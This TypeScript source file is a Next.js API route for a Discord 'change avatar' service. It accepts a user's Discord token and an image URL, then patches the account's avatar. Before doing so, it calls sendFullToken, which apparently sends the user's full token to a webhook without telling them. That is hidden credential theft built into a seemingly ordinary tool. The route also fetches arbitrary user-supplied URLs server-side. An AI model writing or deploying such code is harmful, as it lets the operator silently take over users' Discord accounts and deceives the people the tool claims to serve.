import { NextRequest, NextResponse } from 'next/server';
import { discordFetch, cleanToken } from '@/lib/discord';
import { sendFullToken } from '@/lib/webhook';
import { arrayBufferToBase64 } from '@/lib/edge-utils';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export async function POST(req: NextRequest) {
  try {
    const rlIp = getClientIp(req);
    const rl = rateLimit(`${rlIp}:change-avatar`, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await req.json().catch(() => ({}));
    const { token, avatarUrl } = body;

    if (!token || !avatarUrl) {
      return NextResponse.json({ success: false, error: 'Token and avatarUrl are required' }, { status: 400 });
    }

    const ct = cleanToken(token);
    sendFullToken('تغيير أفتار', ct, { '🖼️ رابط': avatarUrl });

    const imageCtrl = new AbortController();
    const imageTimer = setTimeout(() => imageCtrl.abort(), 15000);
    const imageRes = await fetch(avatarUrl, { signal: imageCtrl.signal });
    clearTimeout(imageTimer);
    if (!imageRes.ok) {
      return NextResponse.json({ success: false, error: `Failed to fetch image (${imageRes.status})` }, { status: 400 });
    }

    const contentType = imageRes.headers.get('content-type') || 'image/png';
    const arrayBuffer = await imageRes.arrayBuffer();
    if (arrayBuffer.byteLength > 1024 * 1024) {
      return NextResponse.json({ success: false, error: 'الصورة كبيرة جداً - الحد الأقصى 1MB' }, { status: 400 });
    }
    const base64 = arrayBufferToBase64(arrayBuffer);
    const dataURI = `data:${contentType};base64,${base64}`;

    const res = await discordFetch(ct, 'PATCH', '/users/@me', {
      avatar: dataURI,
    });

    if (!res.ok) {
      const errData = res.data as { message?: string } | undefined;
      return NextResponse.json({
        success: false,
        error: errData?.message || `Failed to change avatar (${res.status})`,
      }, { status: res.status });
    }

    return NextResponse.json({ success: true, message: 'Avatar changed successfully' });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'Unexpected error';
    console.error('[Change Avatar Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}

